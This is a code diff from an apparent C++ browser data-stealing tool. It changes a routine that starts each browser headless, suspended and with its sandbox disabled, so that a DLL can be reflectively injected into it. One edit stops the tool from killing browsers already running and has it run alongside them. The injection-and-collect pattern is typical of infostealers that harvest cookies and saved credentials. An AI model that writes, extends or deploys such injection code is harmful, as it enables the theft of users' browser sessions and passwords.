@@ -175,9 +175,9 @@ void inject_dll_reflective(HANDLE h_process, const std::vector<unsigned char>& d
 void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const BrowserConfig& browser) {
     std::wcout << L"\n--- Processing Browser: " << browser.name << L" ---" << std::endl;
 
-    kill_processes_by_name(browser.exe_name);
+    // kill_processes_by_name(browser.exe_name); // Don't kill, let it run in parallel
 
-    std::wstring cmd = browser.exe_name + L" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
+    std::wstring cmd = browser.exe_name + L" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions --disable-software-rasterizer --disable-gpu-compositing --disable-infobars about:blank";
     std::vector<wchar_t> cmd_buf(cmd.begin(), cmd.end());
     cmd_buf.push_back(0);
 
@@ -190,7 +190,7 @@ void inject_and_collect(const std::vector<unsigned char>& dll_bytes, const Brows
     if (!success) {
         std::wstring path = find_browser_exe(browser.name);
         if (!path.empty()) {
-            std::wstring full_cmd = L"\"" + path + L"\" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions about:blank";
+            std::wstring full_cmd = L"\"" + path + L"\" --headless --disable-gpu --no-sandbox --disable-setuid-sandbox --disable-extensions --disable-software-rasterizer --disable-gpu-compositing --disable-infobars about:blank";
             std::vector<wchar_t> full_cmd_buf(full_cmd.begin(), full_cmd.end());
             full_cmd_buf.push_back(0);
             success = CreateProcessW(NULL, full_cmd_buf.data(), NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
